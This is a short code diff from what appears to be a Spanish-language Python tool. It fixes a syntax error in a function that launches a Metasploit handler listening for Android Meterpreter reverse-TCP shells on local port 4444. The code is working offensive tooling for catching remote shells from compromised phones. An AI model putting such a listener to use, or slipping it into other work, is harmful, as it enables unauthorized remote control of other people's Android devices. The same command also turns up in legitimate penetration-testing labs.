@@ -196,7 +196,7 @@ COMPRUEBA QUE NO ESTAS CON WIFI Y QUE TIENES LA ZONA WIFI ACTIVADA
 def msf():
  var=os.system("which msfconsole")
  banner()
- if var == 0
+ if var == 0:
    banner()
    os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
  else :
